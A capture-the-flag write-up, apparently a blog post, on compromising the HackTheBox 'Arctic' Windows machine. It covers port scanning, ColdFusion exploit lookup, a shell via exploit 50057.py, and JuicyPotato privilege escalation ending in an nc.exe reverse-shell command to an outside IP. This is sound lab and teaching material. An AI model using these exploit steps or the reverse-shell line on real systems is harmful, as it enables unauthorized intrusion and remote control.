---
title: HTB | Arctic
author: Zeropio
date: 2023-01-04
categories: [Pentesting, HackTheBox]
tags: [htb, windows, easy, machines]
permalink: /pentesting/htb/machines/arctic
image:
  path: /assets/img/hackthebox/card/Arctic.png
  width: 800
  height: 500
---

# Fingerprint

## Scan

The scan show:

```
PORT      STATE SERVICE VERSION
135/tcp   open  msrpc   Microsoft Windows RPC
8500/tcp  open  fmtp?
49154/tcp open  msrpc   Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

Scanning for the OS:

```
Aggressive OS guesses: Microsoft Windows Server 2008 R2 (91%),
```

## Enumeration

We can enumerate both RPC services and found some remote code execution:

```console
$ rpcdump.py -p 135 10.10.10.11 | grep "atsvc"
          ncacn_np:\\ARCTIC[\PIPE\atsvc]
          ncacn_np:\\ARCTIC[\PIPE\atsvc]
          ncacn_np:\\ARCTIC[\PIPE\atsvc]
          ncacn_np:\\ARCTIC[\PIPE\atsvc]
          ncacn_np:\\ARCTIC[\PIPE\atsvc]
```

In the port 8500 we can found a web with the following contents:

```
CFIDE/               dir   03/22/17 08:52 μμ
cfdocs/              dir   03/22/17 08:55 μμ
```

If we go under `/CFIDE/administrator/`{: .filepath} we can found a ********ColdFusion******** login. Easily, a exploit can be found:

```console
$ searchsploit coldfusion                
------------------------------------------------------ ---------------------------------
 Exploit Title                                        |  Path
------------------------------------------------------ ---------------------------------
Adobe ColdFusion - 'probe.cfm' Cross-Site Scripting   | cfm/webapps/36067.txt
Adobe ColdFusion - Directory Traversal                | multiple/remote/14641.py
Adobe ColdFusion - Directory Traversal (Metasploit)   | multiple/remote/16985.rb
Adobe ColdFusion 11 - LDAP Java Object Deserializatio | windows/remote/50781.txt
Adobe Coldfusion 11.0.03.292866 - BlazeDS Java Object | windows/remote/43993.py
Adobe ColdFusion 2018 - Arbitrary File Upload         | multiple/webapps/45979.txt
Adobe ColdFusion 6/7 - User_Agent Error Page Cross-Si | cfm/webapps/29567.txt
Adobe ColdFusion 7 - Multiple Cross-Site Scripting Vu | cfm/webapps/36172.txt
Adobe ColdFusion 8 - Remote Command Execution (RCE)   | cfm/webapps/50057.py
```

---

# Footprint

## Initial Access

We will use the previous exploit changing the lhost for our IP. With this, we get an easy shell:

```console
$ python3 50057.py

. . . <SNIP> . . .

C:\ColdFusion8\runtime\bin>whoami
arctic\tolis
```

## Privilege Escalation

We can use JuicyPotato to exploit it:

```console
C:\Users\tolis\Documents>.\JuicyPotato.exe -t * -l 1337 -p C:\Windows\System32\cmd.exe -a "/c C:\Users\tolis\Documents\nc.exe -e cmd 10.10.14.13 443"
```
